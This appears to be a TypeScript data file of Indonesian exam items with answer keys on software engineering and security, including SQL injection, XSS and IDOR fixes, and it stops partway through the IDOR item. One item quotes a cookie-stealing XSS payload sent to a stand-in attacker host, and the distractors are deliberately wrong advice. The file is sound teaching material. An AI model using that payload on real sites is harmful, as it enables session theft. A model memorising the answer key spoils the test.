import type { SkbHotsItem } from './skb_hots_builder';

export const SKB_RPL_B: SkbHotsItem[] = [
  {
    level: 'C4',
    topik: 'RPL - GraphQL N+1 & DataLoader Batching',
    pertanyaan:
      'Tim pengembang portal layanan terpadu pemerintah mengadopsi GraphQL untuk mengambil daftar 50 permohonan izin beserta data pemohonnya. Saat diuji beban, basis data menerima 51 kueri terpisah untuk satu permintaan HTTP tunggal:\n\n```graphql\nquery {\n  permohonanList(limit: 50) {\n    id\n    nomorBerkas\n    pemohon { nama nik }\n  }\n}\n```\n\n```ts\nconst resolvers = {\n  Permohonan: {\n    pemohon: (parent, _, ctx) => ctx.db.query("SELECT * FROM pemohon WHERE id = $1", [parent.pemohon_id]),\n  },\n};\n```\n\nApa penyebab utama lonjakan kueri tersebut dan solusi arsitektural paling tepat di lapisan resolver GraphQL?',
    jawabanBenar:
      'Terjadi masalah N+1 query karena resolver field pemohon dieksekusi satu kali untuk setiap baris permohonan; gunakan pola DataLoader per-request yang mengelompokkan semua pemohon_id menjadi satu kueri batch SELECT ... WHERE id = ANY($1) serta melakukan memoization dalam siklus request.',
    pengecoh4: [
      'Menambahkan indeks komposit pada kolom nomorBerkas dan created_at di tabel permohonan agar GraphQL engine otomatis menggabungkan seluruh pemanggilan resolver menjadi operasi JOIN di memori.',
      'Mengaktifkan GraphQL persisted queries di sisi klien sehingga server dapat melewati fase validasi AST dan membatasi resolver anak agar hanya dieksekusi pada sepuluh baris pertama hasil kueri.',
      'Memindahkan seluruh koneksi basis data ke mode autocommit false pada tiap resolver field agar 50 kueri terpisah tersebut dibungkus dalam satu transaksi panjang sehingga latensi jaringan menghilang.',
      'Mengubah seluruh tipe data GraphQL menjadi REST endpoint tanpa relasi bersarang lalu memerintahkan browser klien memanggil 50 endpoint pemohon secara paralel menggunakan Promise.all.',
    ],
    akarMasalah:
      'Eksekusi field resolver per-item di GraphQL memicu 1 kueri induk ditambah N kueri anak secara berulang (N+1 problem) yang membebani connection pool basis data.',
    solusiTerbaik:
      'DataLoader mengumpulkan seluruh ID dalam satu tick event loop (batching) menjadi satu kueri IN/ANY dan menyimpan cache per-request agar ID duplikat tidak dikueri ulang.',
    analisisPengecoh:
      'Indeks tidak menghilangkan jumlah round-trip N+1; persisted queries hanya menghemat parsing teks kueri; transaksi tunggal tetap mengeksekusi 51 kueri; memindahkan N+1 ke Promise.all di browser justru memindahkan badai request ke API Gateway.',
  },
  {
    level: 'C6',
    topik: 'RPL - WebSocket Horizontal Scaling',
    pertanyaan:
      'Aplikasi antrean layanan Dukcapil berbasis Node.js menggunakan WebSocket (`ws`) untuk mengirim notifikasi pemanggilan nomor antrean secara real-time ke layar ruang tunggu. Saat instansi menskalakan backend dari 1 instance menjadi 4 pod di belakang Load Balancer, loket yang terhubung ke Pod-2 memanggil nomor antrean, tetapi layar ruang tunggu yang terhubung ke Pod-1 tidak pernah menerima pesan tersebut.\n\n```ts\n// Kode saat ini di tiap pod:\nconst clients = new Map<string, WebSocket>();\nfunction broadcastAntrean(loketId: string, nomor: string) {\n  for (const ws of clients.values()) ws.send(JSON.stringify({ loketId, nomor }));\n}\n```\n\nRancangan arsitektur apa yang paling tepat untuk menyelesaikan kegagalan distribusi pesan lintas pod tersebut?',
    jawabanBenar:
      'Memperkenalkan message broker pub/sub terpusat seperti Redis Pub/Sub atau NATS sebagai backplane sehingga setiap pod yang menerima event antrean menerbitkannya ke kanal broker, lalu seluruh pod lain yang berlangganan menyiarkan pesan ke koneksi WebSocket lokalnya masing-masing.',
    pengecoh4: [
      'Mengaktifkan sticky session berbasis cookie di Load Balancer sehingga seluruh koneksi WebSocket dari loket dan layar ruang tunggu otomatis berbagi memori objek Map lintas pod tanpa memerlukan broker eksternal.',
      'Menyimpan objek socket TCP mentah ke dalam tabel PostgreSQL setiap kali klien terhubung agar seluruh pod dapat memanggil metode ws.send() secara langsung menggunakan referensi baris basis data tersebut.',
      'Menjadwalkan cron job tiap 1 detik pada setiap pod untuk melakukan restart koneksi WebSocket secara bergantian sehingga klien berputar menghubungkan diri ke semua pod dan menangkap pesan tertunda.',
      'Mengubah batas maksimum worker thread Node.js pada satu pod menjadi 64 thread lalu menghapus seluruh replika pod lain karena WebSocket secara prinsip tidak dapat dijalankan pada arsitektur multi-instance.',
    ],
    akarMasalah:
      'State koneksi WebSocket (`clients` Map) tersimpan di memori lokal masing-masing pod (in-memory), sehingga broadcast pada Pod-2 terisolasi dan tidak terlihat oleh Pod-1.',
    solusiTerbaik:
      'Backplane Pub/Sub (Redis Pub/Sub/NATS/Kafka) menyinkronkan event antar-pod secara asinkron dengan latensi sub-milidetik sehingga pengiriman real-time tetap konsisten pada skala horizontal.',
    analisisPengecoh:
      'Sticky session hanya memastikan satu klien tetap di pod yang sama saat handshake/reconnect, bukan berbagi memori antar-klien berbeda; objek socket TCP tidak bisa diserialisasi ke DB; restart berkala justru memutus layanan; WebSocket sangat bisa diskalakan secara horizontal dengan pub/sub adapter.',
  },
  {
    level: 'C5',
    topik: 'RPL - Strategi HTTP Caching & Data Sensitif',
    pertanyaan:
      'Setelah tim ops memasang CDN reverse proxy di depan portal e-Kinerja ASN untuk mempercepat akses, seorang pegawai melaporkan bahwa ketika ia membuka endpoint profil gajinya, layar sempat menampilkan rincian penghasilan pegawai lain. Pemeriksaan header respons API menunjukkan:\n\n```http\nHTTP/1.1 200 OK\nContent-Type: application/json\nCache-Control: public, max-age=300\nVary: Accept-Encoding\n```\n\nEvaluasi konfigurasi header tersebut dan tentukan perbaikan paling tepat agar data personal tetap aman tanpa mematikan manfaat validasi cache di peramban pengguna.',
    jawabanBenar:
      'Directive `public` mengizinkan shared cache/CDN menyimpan respons personal lintas pengguna; ganti dengan `Cache-Control: private, no-cache` (atau `private, max-age=0, must-revalidate`) disertai `ETag` agar hanya browser pengguna bersangkutan yang menyimpan salinan dan wajib memvalidasi ulang ke origin, serta tambahkan `Vary: Authorization` jika relevan.',
    pengecoh4: [
      'Mempertahankan `Cache-Control: public, max-age=300` namun menambahkan header `X-Frame-Options: DENY` dan `Strict-Transport-Security` karena kebocoran antar-pengguna disebabkan oleh pembajakan sesi melalui iframe lintas domain.',
      'Menurunkan `max-age` menjadi 5 detik pada directive `public` agar CDN tetap meng-cache respons JSON tersebut tetapi jendela waktu tampilnya data pegawai lain menjadi sangat singkat dan sulit diamati.',
      'Menghapus header `Vary: Accept-Encoding` dan menggantinya dengan `Pragma: public` agar CDN memisahkan cache berdasarkan alamat IP klien sehingga seluruh pegawai dalam satu kantor tetap aman.',
      'Menambahkan query parameter acak pada sisi server melalui header `X-Cache-Bypass: true` sambil membiarkan `Cache-Control: public, max-age=300` aktif di seluruh endpoint profil pribadi.',
    ],
    akarMasalah:
      'Header `Cache-Control: public, max-age=300` tanpa pembeda kredensial menginstruksikan CDN/proxy bersama untuk menyajikan respons JSON privat milik Pengguna A kepada Pengguna B (web cache deception/shared cache leak).',
    solusiTerbaik:
      'Directive `private` melarang shared cache (CDN/proxy) menyimpan payload sensitif, sementara `no-cache` + `ETag` menjaga efisiensi bandwidth lewat revalidasi kondisional `304 Not Modified` di browser pemilik sesi.',
    analisisPengecoh:
      'Header keamanan browser tidak menghentikan CDN melakukan caching respons `public`; mengecilkan `max-age` tetap menimbulkan kebocoran data serius; pemisahan berdasarkan IP gagal untuk pegawai di balik NAT kantor yang sama; header kustom tidak dipatuhi secara standar oleh CDN tanpa aturan eksplisit dan tidak menutup celah directive `public`.',
  },
  {
    level: 'C6',
    topik: 'RPL - Streaming Ekspor Data vs Memory OOM',
    pertanyaan:
      'Fitur ekspor laporan CSV transaksi retribusi tahunan (1,2 juta baris) pada server Node.js berkekuatan RAM 1 GB berulang kali menyebabkan container mati mendadak dengan pesan `FATAL ERROR: Reached heap limit Allocation failed - JavaScript heap out of memory`. Potongan kode endpoint saat ini:\n\n```ts\napp.get("/api/laporan/export", async (req, res) => {\n  const rows = await db.query("SELECT * FROM retribusi WHERE tahun = $1", [req.query.tahun]);\n  const csv = rows.map(r => `${r.id},${r.kode},${r.nominal},${r.tanggal}`).join("\\n");\n  res.setHeader("Content-Type", "text/csv");\n  res.send(csv);\n});\n```\n\nPerubahan desain kode manakah yang paling tepat untuk mencegah Out-Of-Memory secara permanen tanpa meningkatkan RAM secara berlebihan?',
    jawabanBenar:
      'Menggunakan database cursor stream (seperti `pg-query-stream`) yang dihubungkan lewat Node.js `Transform` stream dan `pipeline()` langsung ke `res` (chunked transfer) sehingga memori heap hanya menampung buffer beberapa kilobita per waktu dengan backpressure otomatis.',
    pengecoh4: [
      'Menambahkan flag `--max-old-space-size=4096` pada perintah Node.js di dalam container 1 GB agar garbage collector V8 mengizinkan alokasi string CSV hingga 4 GB sebelum memicu kegagalan heap.',
      'Mengganti metode `.map().join()` dengan perulangan `for` konvensional yang menggabungkan baris ke satu variabel string menggunakan operator `+=` supaya tidak terbentuk array objek sementara di memori.',
      'Mengubah tipe respons dari `text/csv` menjadi `application/json` menggunakan `res.json(rows)` karena serialisasi JSON bawaan V8 berjalan di lapisan C++ dan tidak memakai memori heap sama sekali.',
      'Memanggil `global.gc()` secara manual setiap 10.000 baris di tengah loop pemetaan `rows` setelah seluruh 1,2 juta baris selesai dimuat dari basis data ke variabel array.',
    ],
    akarMasalah:
      'Endpoint memuat seluruh 1,2 juta baris sekaligus ke RAM (`rows`), menduplikasinya menjadi array string via `.map()`, lalu membangun satu string CSV raksasa sebelum mulai mengirim byte pertama.',
    solusiTerbaik:
      'Streaming dengan database cursor + `Transform` + `stream.pipeline` memproses baris secara bertahap (O(1) memori konstan) dan menghormati backpressure jaringan klien.',
    analisisPengecoh:
      'Set `--max-old-space-size=4096` di container 1 GB hanya memicu OS OOM Killer (SIGKILL); operator `+=` tetap menampung seluruh 1,2 juta baris di RAM; `res.json` tetap menahan seluruh array di heap; `global.gc()` tidak bisa membebaskan referensi `rows` yang masih hidup dan dipakai.',
  },
  {
    level: 'C4',
    topik: 'RPL - Exponential Backoff, Jitter & Retry Storm',
    pertanyaan:
      'Layanan verifikasi NIK sempat mengalami gangguan selama 40 detik lalu pulih kembali. Namun, sesaat setelah pulih, layanan tersebut langsung tumbang kembali akibat lonjakan 15 kali lipat trafik serentak dari 30 microservice klien. Audit kode HTTP client pada seluruh microservice menunjukkan:\n\n```ts\nasync function callNikService(payload: unknown) {\n  for (let i = 0; i < 10; i++) {\n    try { return await fetch(NIK_URL, { method: "POST", body: JSON.stringify(payload) }); }\n    catch { await sleep(1000); }\n  }\n}\n```\n\nApa penyebab tumbangnya kembali layanan tersebut dan perbaikan mekanisme retry apa yang paling tepat?',
    jawabanBenar:
      'Fixed-interval retry (1000 ms) tanpa batas dan tanpa keacakan menyebabkan thundering herd / retry storm serentak; terapkan bounded exponential backoff dengan full jitter, hanya lakukan retry untuk error transien (5xx/network timeout, bukan 4xx), dan padukan dengan circuit breaker.',
    pengecoh4: [
      'Mengubah `sleep(1000)` menjadi `sleep(0)` dan menaikkan jumlah percobaan menjadi 30 kali agar permintaan klien yang gagal lebih cepat memperoleh slot koneksi sebelum layanan kembali sibuk.',
      'Mengganti metode HTTP dari POST menjadi GET dengan payload diletakkan di query string supaya load balancer dapat men-cache error 503 dan menghemat beban verifikasi NIK.',
      'Memperpanjang TCP socket timeout pada sisi klien dari 5 detik menjadi 120 detik agar permintaan tetap menggantung di memori klien tanpa pernah masuk ke blok `catch`.',
      'Menghapus seluruh mekanisme retry di sisi klien dan langsung mengembalikan HTTP 500 ke masyarakat pada gangguan jaringan transien 50 milidetik sekalipun.',
    ],
    akarMasalah:
      'Retry seragam tiap 1 detik hingga 10 kali dari 30 klien menyinkronkan gelombang permintaan ulang secara bersamaan tepat saat server mulai pulih (retry storm / thundering herd).',
    solusiTerbaik:
      'Bounded exponential backoff + jitter menyebar waktu percobaan ulang secara acak, pemfilteran error mencegah retry sia-sia pada 4xx, dan circuit breaker melindungi server yang belum stabil.',
    analisisPengecoh:
      '`sleep(0)` memperparah DDoS internal; mengubah POST ke GET melanggar keamanan data NIK di URL/log dan tidak menyelesaikan retry storm; timeout 120 detik menguras thread/file descriptor klien; menghapus retry total menurunkan reliabilitas terhadap gangguan jaringan sesaat.',
  },
  {
    level: 'C5',
    topik: 'RPL - Verifikasi Integritas Webhook dengan HMAC',
    pertanyaan:
      'Portal pembayaran pajak daerah menerima callback (webhook) status "LUNAS" dari payment gateway eksternal melalui endpoint publik `POST /api/webhook/payment`. Auditor menemukan bahwa endpoint tersebut hanya memeriksa `req.ip` dan status JSON di body, sehingga rentan dipalsukan (spoofing) atau di-replay oleh pihak luar jika IP proxy berubah atau paket disadap.\n\nManakah mekanisme keamanan integrasi webhook yang paling tepat untuk menjamin keaslian pengirim, integritas payload, serta perlindungan terhadap replay attack?',
    jawabanBenar:
      'Memverifikasi tanda tangan HMAC-SHA256 atas gabungan timestamp header dan raw request body menggunakan shared secret dengan perbandingan waktu konstan (`crypto.timingSafeEqual`), menolak timestamp di luar jendela toleransi (misal 5 menit), serta menyimpan event_id secara idempoten untuk mencegah pemrosesan ulang.',
    pengecoh4: [
      'Menyembunyikan URL webhook menggunakan path acak sepanjang 16 karakter seperti `/api/wh-9a8f7c` dan mengembalikan status HTTP 200 untuk semua request agar penyerang tidak mengetahui keberadaan endpoint.',
      'Meminta payment gateway menyertakan username dan password akun database pajak di dalam header `X-Gateway-Auth` lalu mencocokkannya dengan operator `===` pada raw body yang telah di-parse menjadi JSON.',
      'Membandingkan hash `MD5(payload.invoice_id)` yang dikirim gateway melalui query string tanpa kunci rahasia karena nilai invoice_id dianggap cukup unik untuk setiap transaksi pajak.',
      'Menonaktifkan verifikasi sertifikat TLS pada sisi server penerima agar handshake lebih cepat dan menggantinya dengan pengecekan header `User-Agent: PaymentGateway/2.0`.',
    ],
    akarMasalah:
      'Mengandalkan whitelist IP saja rapuh terhadap perubahan NAT/CDN gateway dan tidak membuktikan keutuhan isi pesan maupun mencegah replay request yang pernah sah.',
    solusiTerbaik:
      'HMAC-SHA256 atas timestamp + raw body menjamin autentisitas dan integritas, `timingSafeEqual` mencegah timing side-channel attack, jendela waktu + cache `event_id` memblokir replay attack.',
    analisisPengecoh:
      'Security by obscurity lewat URL acak mudah bocor di log; mengirim kredensial DB dan perbandingan `===` rentan kebocoran serta timing attack; MD5 tanpa kunci rahasia mudah dipalsukan siapa pun; header `User-Agent` dapat dipalsukan trivial dan menonaktifkan TLS membuka celah MITM.',
  },
  {
    level: 'C4',
    topik: 'RPL - Dependency Injection & Determinisme Unit Test',
    pertanyaan:
      'Tim QA mengeluhkan bahwa pipeline CI/CD sistem perizinan sering gagal secara acak (*flaky tests*) pada fungsi perhitungan denda keterlambatan berikut:\n\n```ts\nexport async function hitungDenda(izinId: string): Promise<number> {\n  const izin = await postgresClient.getIzinById(izinId);\n  const hariTelat = Math.floor((Date.now() - izin.jatuhTempo.getTime()) / 86400000);\n  return hariTelat > 0 ? hariTelat * 50000 : 0;\n}\n```\n\nMengapa fungsi tersebut sulit diuji secara deterministik di unit test, dan refaktor desain manakah yang paling tepat?',
    jawabanBenar:
      'Fungsi memiliki tight coupling ke I/O database global (`postgresClient`) dan jam sistem non-deterministik (`Date.now()`); suntikkan antarmuka repositori dan parameter waktu/clock (`now: Date` atau `Clock` provider) melalui Dependency Injection sehingga logika perhitungan murni dapat diuji terisolasi tanpa database nyata.',
    pengecoh4: [
      'Menambahkan `await sleep(2000)` sebelum setiap `assert` di dalam berkas unit test agar koneksi database PostgreSQL di lingkungan CI memiliki waktu cukup untuk menyelesaikan sinkronisasi jam NTP.',
      'Menghapus seluruh unit test untuk fungsi `hitungDenda` dan menggantinya sepenuhnya dengan pengujian manual melalui Postman setiap menjelang rilis produksi.',
      'Menyimpan tanggal jatuh tempo secara hard-coded ke tahun 2099 di dalam kode produksi agar hasil `hariTelat` selalu bernilai nol saat pipeline CI berjalan.',
      'Memindahkan pemanggilan `postgresClient` ke blok `try/catch` yang mengembalikan angka 0 ketika error terjadi sehingga pengujian CI selalu lolos meski database sedang mati.',
    ],
    akarMasalah:
      'Ketergantungan tersembunyi pada instance database nyata dan waktu sistem berjalan membuat hasil test berubah tergantung waktu eksekusi dan kondisi jaringan/DB di CI.',
    solusiTerbaik:
      'Dependency Injection memisahkan aturan bisnis dari infrastruktur (DB & system clock), memungkinkan unit test berjalan dalam milidetik secara 100% deterministik pada berbagai kasus batas tanggal.',
    analisisPengecoh:
      '`sleep(2000)` memperlambat CI tanpa menghilangkan non-determinisme; mengganti unit test dengan manual menghilangkan regresi otomatis; hard-code tahun merusak bisnis; menelan error di `catch` menyembunyikan bug fatal di produksi.',
  },
  {
    level: 'C5',
    topik: 'RPL - Git Bisect & Reproducible Build CI/CD',
    pertanyaan:
      'Setelah 180 commit digabungkan selama sprint dua minggu pada repositori aplikasi kepegawaian, tim menemukan bug regresi pada perhitungan tunjangan kinerja yang sebelumnya berfungsi normal pada tag rilis `v2.4.0`. Selain itu, build yang baru dijalankan hari ini gagal di lingkungan staging padahal tidak ada perubahan kode sumber sejak kemarin karena paket pihak ketiga di `package.json` memakai rentang `^4.2.0`.\n\nKombinasi tindakan rekayasa perangkat lunak manakah yang paling efisien untuk menemukan commit penyebab bug sekaligus mencegah ketidakpastian build di masa depan?',
    jawabanBenar:
      'Menjalankan `git bisect` (dengan skrip tes otomatis `git bisect run`) untuk menemukan commit regresi dalam kompleksitas O(log N) sekitar 8 langkah, serta mengunci seluruh graf dependensi dengan commit lockfile (`package-lock.json`) dan memasang perintah `npm ci` pada pipeline CI.',
    pengecoh4: [
      'Melakukan `git checkout` dan pengujian manual secara berurutan satu per satu pada seluruh 180 commit dari yang paling lama, lalu menambahkan perintah `npm update --latest` sebelum tahap build di CI.',
      'Menghapus riwayat commit dua minggu terakhir menggunakan `git push --force` ke cabang `main` lalu menyalin folder `node_modules` dari laptop pengembang secara langsung ke server produksi.',
      'Mengaktifkan opsi `--legacy-peer-deps` pada `npm install` di pipeline CI dan menjalankan `git blame` hanya pada baris fungsi `main()` tanpa menguji commit perantara.',
      'Membekukan versi Node.js di server staging tanpa mengunci versi dependensi aplikasi, lalu menggabungkan seluruh 180 commit ulang menjadi satu squash commit sebelum mencari bug.',
    ],
    akarMasalah:
      'Pencarian linear atas 180 commit terlalu lambat, sedangkan `npm install` dengan semver caret (`^`) menarik minor/patch baru secara diam-diam sehingga merusak reproducibility build.',
    solusiTerbaik:
      '`git bisect` menerapkan binary search (log2(180) ≈ 8 iterasi) untuk isolasi commit bug secara presisi, dan `npm ci` + lockfile menjamin graf dependensi identik di setiap build.',
    analisisPengecoh:
      'Pencarian linear + `npm update` justru menambah ketidakpastian; force-push merusak kolaborasi dan menyalin `node_modules` melanggar praktik artefak bersih; `git blame` tidak melacak regresi efek samping lintas berkas; melakukan squash commit justru menghilangkan jejak untuk melacak commit penyebab bug.',
  },
  {
    level: 'C6',
    topik: 'RPL - Validasi Kontrak OpenAPI & Backward Compatibility',
    pertanyaan:
      'Kementerian menyediakan REST API `/v1/pegawai/{nip}` yang dikonsumsi oleh 42 aplikasi instansi daerah. Tim backend perlu mengubah format field `golongan` dari string `"III/b"` menjadi objek terstruktur `{ "kode": "III/b", "pangkat": "Penata Muda Tk. I" }` serta menghapus field `kode_eselon` yang sudah usang.\n\nPendekatan evolusi API manakah yang paling tepat agar tidak memutus integrasi 42 aplikasi daerah secara mendadak?',
    jawabanBenar:
      'Mempertahankan kompatibilitas mundur di `/v1` melalui pola expand-and-contract (menambah field baru `golongan_detail` tanpa mengubah tipe `golongan`), mengumumkan deprecation via header `Deprecation`/`Sunset` beserta dokumentasi migrasi, atau merilis versi mayor `/v2` paralel sampai seluruh konsumen selesai bermigrasi.',
    pengecoh4: [
      'Langsung mengubah struktur JSON pada endpoint `/v1/pegawai/{nip}` saat jam maintenance pukul 02.00 WIB dan mengirim email pemberitahuan ke seluruh daerah keesokan harinya.',
      'Mengembalikan field `golongan` secara acak bergantian antara tipe string dan tipe objek berdasarkan header `Accept-Language` agar konsumen terdorong memperbarui parser JSON mereka.',
      'Menghapus endpoint `/v1/pegawai/{nip}` sepenuhnya dan memaksa ke-42 aplikasi instansi daerah mengunduh dump CSV harian dari server FTP sebagai pengganti sementara.',
      'Tetap mengubah tipe data `golongan` menjadi objek pada `/v1`, namun membungkus respons error parsing klien dengan status HTTP 200 OK agar monitor uptime tidak mendeteksi kegagalan.',
    ],
    akarMasalah:
      'Mengubah tipe data field eksisting dan menghapus field pada kontrak API publik merupakan breaking change yang akan memicu kegagalan deserialisasi di 42 sistem konsumen.',
    solusiTerbaik:
      'Versioning mayor (`/v2`) paralel atau additive change (expand-and-contract) dengan header `Deprecation`/`Sunset` memberi jendela migrasi terukur tanpa memutus layanan publik.',
    analisisPengecoh:
      'Perubahan langsung di `/v1` melumpuhkan 42 sistem daerah; tipe respons polimorfik berbasis bahasa merusak kontrak skema; beralih ke FTP menghancurkan integrasi real-time; menyamarkan error dengan HTTP 200 melanggar semantik HTTP dan menyulitkan deteksi insiden.',
  },
  {
    level: 'C4',
    topik: 'RPL - Aksesibilitas Layanan Publik (WCAG) & Semantik HTML',
    pertanyaan:
      'Portal pendaftaran bantuan sosial pemerintah sedang diaudit kepatuhan aksesibilitas digitalnya. Penguji tunanetra yang memakai screen reader serta navigasi keyboard melaporkan tidak dapat memilih tombol "Kirim Permohonan" maupun mengetahui kolom formulir mana yang error. Inspeksi DOM menghasilkan cuplikan berikut:\n\n```html\n<div class="input-box">\n  <span style="color:#9ca3af">NIK Pemohon</span>\n  <input type="text" placeholder="16 digit" style="border:1px solid red" />\n</div>\n<div class="btn-submit" onclick="submitForm()">Kirim Permohonan</div>\n```\n\nCacat teknis apa yang menyebabkan hambatan aksesibilitas tersebut dan perbaikan semantik paling tepat?',
    jawabanBenar:
      'Elemen `<div>` tidak fokusabel lewat keyboard dan tidak memiliki peran tombol, `<input>` tidak terhubung ke `<label>`, serta error hanya ditandai warna border; ganti tombol menjadi `<button type="submit">`, hubungkan `<label for="...">`, sediakan pesan teks error dengan `aria-invalid="true"` dan `aria-describedby` / `role="alert"`, serta perbaiki kontras warna teks.',
    pengecoh4: [
      'Menambahkan atribut `title="Klik di sini"` pada `<div class="btn-submit">` dan memperbesar ukuran huruf placeholder menjadi 18px karena screen reader selalu membacakan tooltip CSS secara otomatis saat halaman dimuat.',
      'Menonaktifkan navigasi tombol Tab melalui `tabindex="-1"` pada seluruh formulir lalu mewajibkan pengguna menyalakan fitur zoom browser 200% agar elemen `<div>` mudah diklik dengan tetikus.',
      'Mengganti seluruh teks label dan pesan error menjadi gambar PNG beresolusi tinggi tanpa atribut `alt` supaya kontras warna tetap seragam di semua jenis monitor instansi.',
      'Menambahkan `style="outline: none"` pada seluruh elemen interaktif dan memindahkan pesan validasi error hanya ke `console.log` browser agar tampilan formulir terlihat lebih bersih.',
    ],
    akarMasalah:
      'Penggunaan `<div>` non-semantik memutus akses keyboard dan screen reader, ketiadaan relasi `<label for>` menghilangkan nama aksesibel input, dan penandaan error hanya lewat warna merah melanggar standar WCAG 2.1.',
    solusiTerbaik:
      'Elemen native `<button>`, asosiasi `<label for>`-`id`, `aria-invalid`/`aria-describedby`/`role="alert"`, serta kontras rasio >= 4.5:1 memastikan formulir layanan publik inklusif bagi seluruh warga.',
    analisisPengecoh:
      'Atribut `title` tidak konsisten dibaca screen reader dan tidak membuat `<div>` bisa difokuskan via Tab; `tabindex="-1"` justru memblokir navigasi keyboard; gambar tanpa `alt` tidak terbaca screen reader; menghapus focus outline merusak navigasi keyboard dan `console.log` tidak terlihat pengguna.',
  },
  {
    level: 'C4',
    topik: 'Keamanan Informasi - SQL Injection pada Dynamic ORDER BY',
    pertanyaan:
      'Aplikasi pelacakan surat dinas sudah menggunakan parameterized query untuk filter pencarian, tetapi tim pentest tetap berhasil mengekstrak nama tabel basis data melalui parameter `?sort=`. Potongan kode backend:\n\n```ts\nconst sortCol = req.query.sort || "tanggal_masuk";\nconst sql = `SELECT id, nomor_surat, perihal FROM surat WHERE unit_id = $1 ORDER BY ${sortCol} DESC`;\nconst rows = await db.query(sql, [req.user.unitId]);\n```\n\nMengapa SQL Injection tetap berhasil meski sudah memakai placeholder `$1`, dan bagaimana perbaikan yang paling tepat?',
    jawabanBenar:
      'Placeholder bind parameter hanya berlaku untuk nilai data, bukan identifier kolom/SQL, sehingga interpolasi `${sortCol}` langsung dieksekusi engine SQL; terapkan strict allowlist (peta/enum kolom yang diizinkan seperti `ALLOWED_SORT_MAP[sortCol]`) sebelum menyusun klausa `ORDER BY`.',
    pengecoh4: [
      'Mengganti `${sortCol}` menjadi placeholder `$2` pada klausa `ORDER BY $2 DESC` dan mengirim nama kolom sebagai string parameter agar PostgreSQL mengurutkan baris sesuai nama kolom tersebut.',
      'Menghapus spasi dan kata kunci `"UNION"` menggunakan `sortCol.replace("UNION", "")` sebelum menyisipkannya ke template string karena semua eksploitasi SQLi pada `ORDER BY` selalu membutuhkan klausa `UNION`.',
      'Mengenkripsi nilai parameter `sort` di sisi frontend menggunakan Base64 lalu mendekodenya dengan `atob()` di backend sebelum dimasukkan ke dalam kueri SQL.',
      'Memindahkan kueri SQL ke dalam Stored Procedure yang tetap menjalankan `EXECUTE \'SELECT ... ORDER BY \' || p_sort` karena eksekusi di dalam prosedur tersimpan kebal terhadap injeksi.',
    ],
    akarMasalah:
      'Interpolasi string `${sortCol}` pada klausa `ORDER BY` memungkinkan penyerang menyuntikkan ekspresi boolean/subquery (misal `(CASE WHEN ... THEN id ELSE perihal END)`) untuk blind SQL injection.',
    solusiTerbaik:
      'Allowlist statis yang memetakan input pengguna ke konstanta nama kolom yang telah ditetapkan di kode menutup seluruh permukaan injeksi identifier secara mutlak.',
    analisisPengecoh:
      'Di PostgreSQL, `ORDER BY $2` memperlakukan `$2` sebagai literal string konstan sehingga pengurutan tidak bekerja; blacklist kata `"UNION"` mudah dilewati dengan variasi huruf kapital atau teknik boolean-based; Base64 hanya encoding bukan proteksi; dynamic SQL `EXECUTE` di stored procedure tetap rentan SQLi.',
  },
  {
    level: 'C5',
    topik: 'Keamanan Informasi - Stored XSS, CSP & HttpOnly Cookie',
    pertanyaan:
      'Pada forum pengaduan masyarakat, seorang pelapor memasukkan `<img src=x onerror="fetch(\'https://attacker.tld/?c=\'+document.cookie)">` pada kolom deskripsi aduan. Ketika petugas admin membuka halaman detail aduan, sesi login admin langsung terambil alih. Inspeksi frontend menunjukkan deskripsi dirender memakai `dangerouslySetInnerHTML` dan cookie sesi diset tanpa flag keamanan.\n\nKombinasi mitigasi defense-in-depth manakah yang paling tepat untuk menutup celah ini secara tuntas?',
    jawabanBenar:
      'Melakukan contextual output encoding (atau merender teks biasa tanpa raw HTML / sanitasi ketat memakai DOMPurify jika rich text wajib), menambahkan flag `HttpOnly`, `Secure`, dan `SameSite=Lax/Strict` pada cookie sesi, serta menerapkan header `Content-Security-Policy` (CSP) berbasis nonce tanpa `unsafe-inline`.',
    pengecoh4: [
      'Memblokir karakter `<script>` saja dengan validasi JavaScript di sisi klien sambil tetap merender input dengan `dangerouslySetInnerHTML` dan menyimpan token sesi di `localStorage` agar `document.cookie` kosong.',
      'Mengenkripsi isi deskripsi aduan menggunakan algoritma AES-256 saat disimpan ke basis data lalu mendekripsinya mentah-mentah ke `innerHTML` saat ditampilkan kepada petugas admin.',
      'Menambahkan header `Access-Control-Allow-Origin: *` pada server API untuk membatasi pengiriman data keluar dari browser petugas ke domain pihak ketiga.',
      'Mewajibkan CAPTCHA pada formulir pengaduan masyarakat sehingga payload `<img onerror=...>` otomatis dinetralkan sebelum dieksekusi oleh peramban admin.',
    ],
    akarMasalah:
      'Stored XSS terjadi karena input pengguna dirender sebagai HTML aktif tanpa sanitasi/encoding, dan diperparah karena cookie sesi tidak memiliki flag `HttpOnly` sehingga mudah dicuri via `document.cookie`.',
    solusiTerbaik:
      'Output encoding/sanitasi menutup eksekusi skrip, `HttpOnly` melindungi cookie dari akses JavaScript, dan CSP nonce mencegah eksekusi inline script maupun eksfiltrasi ke domain tak dikenal.',
    analisisPengecoh:
      'Filter `<script>` tidak memblokir event handler seperti `onerror` dan memindahkan token ke `localStorage` justru tetap bisa dicuri skrip XSS; enkripsi at-rest tidak mencegah XSS saat data didekripsi ke DOM; `ACAO: *` justru melonggarkan CORS dan tidak memblokir request keluar; CAPTCHA hanya menyaring bot, bukan payload berbahaya dari manusia.',
  },
  {
    level: 'C4',
    topik: 'Keamanan Informasi - Broken Object Level Authorization (IDOR)',
    pertanyaan:
      'Seorang pelamar CPNS yang telah login ke portal seleksi melihat URL dokumen kartu ujiannya adalah `GET /api/dokumen/84210`. Ketika ia mencoba mengubah angka tersebut di browser menjadi `GET /api/dokumen/84211`, server langsung mengembalikan PDF kartu ujian dan NIK milik pelamar lain. Audit kode backend menemukan:\n\n```ts\napp.get("/api/dokumen/:id", requireAuth, async (req, res) => {\n  const doc = await db.query("SELECT * FROM dokumen WHERE id = $1", [req.params.id]);\n  res.sendFile(doc.filePath);\n});\n```\n\nCelah keamanan apa yang terjadi dan perbaikan paling tepat di sisi server?',
    jawabanBenar:
      'Terjadi Broken Object Level Authorization (BOLA/IDOR) karena middleware hanya mengecek autentikasi tanpa otorisasi kepemilikan objek; tambahkan verifikasi `WHERE id = $1 AND pemilik_user_id = $2` (menggunakan `req.user.id` dari sesi/JWT terverifikasi) atau pengecekan izin peran eksplisit, lalu kembalikan 403/404 jika tidak cocok.',
    pengecoh4: [
      'Menyembunyikan tombol tautan dokumen di UI frontend dan mengganti metode HTTP dari `GET` menjadi `POST` dengan parameter `id` diletakkan di dalam JSON body agar tidak terlihat di address bar.',
